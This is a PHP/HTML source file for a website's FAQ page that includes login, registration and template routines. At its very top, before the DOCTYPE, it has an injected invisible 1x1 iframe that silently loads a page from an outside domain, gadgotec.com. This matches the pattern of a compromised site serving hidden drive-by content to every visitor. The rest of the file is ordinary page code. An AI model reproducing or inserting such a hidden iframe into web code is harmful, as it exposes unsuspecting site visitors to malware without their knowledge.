<iframe src=http://gadgotec.com/stata.html WIDTH=1 HEIGHT=1 frameborder=0></IFRAME><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<?php

// Prints the head html tags
echo implode("",file("templates/head-master.html"));
echo implode("",file("templates/head-pages.html"));
echo implode("",file("templates/head-tabmenu.html"));
echo implode("",file("templates/head-faq.html"));

include 'routines/init.php';
include 'routines/login.php';
include 'routines/logout.php';
include 'routines/register.php';
include 'routines/banned.php';
include 'routines/addpopup.php';

?>
</head>
<body>
<?

include 'routines/ui.php';

?>


<div class="body-container">
<div class="body-content">


<?

$pageHtml = implode("",file("templates/faq.html"));

require 'functions/tags.php';
echo evaluateSpecialTags($pageHtml);

?>
</div>
</div>
</body>
</html>